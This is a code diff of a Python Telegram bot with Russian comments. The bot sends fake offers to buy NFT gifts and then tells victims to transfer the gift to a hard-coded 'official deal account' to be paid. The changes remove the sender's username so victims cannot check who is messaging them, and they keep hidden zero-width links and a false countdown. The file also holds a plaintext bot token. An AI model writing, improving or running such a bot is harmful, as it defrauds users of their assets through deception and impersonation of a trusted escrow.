@@ -6,7 +6,7 @@ from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
 BOT_TOKEN = "9132697740:AAFlvna4QfTfTaCZ6-RZ2fPGa2mBdba1l_A"
-YOUR_RELAYER_ACCOUNT = "@GiftLink_Relayer" # <--- Официальный аккаунт сделки
+YOUR_RELAYER_ACCOUNT = "@GiftLink_Relayer" # <--- ЖЕСТКО ПРОПИСАННЫЙ АККАУНТ
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
@@ -69,17 +69,15 @@ async def send_offer(message: Message):
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
     nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
 
-    sender_username = message.from_user.username
-    if sender_username:
-        username_display = f"@{sender_username}"
-    else:
-        username_display = message.from_user.first_name
+    # Берем имя, но НЕ ставим @ (чтобы не было ссылки на профиль)
+    sender_name = message.from_user.first_name
 
+    # Ссылка только на NFT
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
     offer_text = (
-        f"<b>{username_display} предлагает Вам\n"
+        f"<b>{sender_name} предлагает Вам\n"
         f"{amount} {currency_display} за подарок {nft_link}.</b>\n\n"
         f"<b>Предложение действует ещё 5ч 59м.</b>\n"
         f"{hidden_link}"
@@ -130,7 +128,7 @@ async def on_accept_offer(callback: CallbackQuery):
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
     
-    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
+    # ЖЕСТКО ПИШЕМ YOUR_RELAYER_ACCOUNT
     new_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
         f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
@@ -177,7 +175,7 @@ async def on_send_transfer(callback: CallbackQuery):
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
+    # ЖЕСТКО ПИШЕМ YOUR_RELAYER_ACCOUNT
     instruction_text = (
         f"<b>Сделка подтверждена.</b>\n\n"
         f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>.\n\n"
@@ -229,7 +227,7 @@ async def back_from_instruction(callback: CallbackQuery):
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Используем YOUR_RELAYER_ACCOUNT вместо ника отправителя
+    # ЖЕСТКО ПИШЕМ YOUR_RELAYER_ACCOUNT
     back_text = (
         f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
         f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} {currency_display}</b>.\n"
